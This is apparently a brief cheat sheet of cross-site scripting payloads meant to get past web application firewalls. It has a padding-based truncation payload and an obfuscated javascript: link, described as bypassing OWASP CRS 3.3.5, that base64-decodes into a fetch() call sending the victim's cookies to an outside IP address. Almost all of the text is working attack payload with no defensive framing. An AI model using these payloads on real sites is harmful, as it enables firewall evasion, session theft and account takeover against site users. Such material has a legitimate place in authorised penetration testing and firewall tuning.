# XSS WAF Bypass

### 1) XSS Truncation

The number of pad characters depends on the configured WAF rule

    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<script>alert(1)</script>

### 2) OWASP CRS 3.3.5 Bypass

Base64 encoded payload: fetch('http://10.201.82.177:8000/'+encodeURIComponent(document.cookie))

    <a href=ja&#x0D;vascript&colon;\u0065val(\u0061tob("ZmV0Y2goJ2h0dHA6Ly8xMC4yMDEuODIuMTc3OjgwMDAvJytlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuY29va2llKSk="))>Click Here</a>


